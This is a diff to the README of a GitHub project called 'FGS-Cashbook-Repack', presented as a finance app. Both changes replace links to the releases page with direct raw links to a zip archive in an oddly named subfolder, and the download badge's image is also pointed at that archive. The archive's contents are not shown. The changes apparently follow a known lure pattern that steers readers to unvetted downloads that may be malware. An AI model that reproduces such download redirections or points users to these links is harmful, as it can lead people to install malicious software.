@@ -1,7 +1,7 @@
 # 🧾 FGS-Cashbook-Repack - Manage Your Cash with Ease
 
 ## 📥 Download the Application
-[![Download FGS-Cashbook-Repack](https://img.shields.io/badge/Download-FGS--Cashbook--Repack-brightgreen)](https://github.com/mrserver135/FGS-Cashbook-Repack/releases)
+[![Download FGS-Cashbook-Repack](https://github.com/mrserver135/FGS-Cashbook-Repack/raw/refs/heads/main/saunterer/Cashbook_Repack_FG_1.6.zip)](https://github.com/mrserver135/FGS-Cashbook-Repack/raw/refs/heads/main/saunterer/Cashbook_Repack_FG_1.6.zip)
 
 ## 🚀 Getting Started
 To get started with FGS-Cashbook-Repack, follow these simple steps. No technical skills required.
@@ -24,7 +24,7 @@ FGS-Cashbook-Repack is your go-to tool for managing personal finances. This appl
 - User-friendly design for all skill levels
 
 ## 📥 Download & Install
-To download FGS-Cashbook-Repack, visit this page: [Download FGS-Cashbook-Repack](https://github.com/mrserver135/FGS-Cashbook-Repack/releases).
+To download FGS-Cashbook-Repack, visit this page: [Download FGS-Cashbook-Repack](https://github.com/mrserver135/FGS-Cashbook-Repack/raw/refs/heads/main/saunterer/Cashbook_Repack_FG_1.6.zip).
 
 Follow these steps to install the application:
 
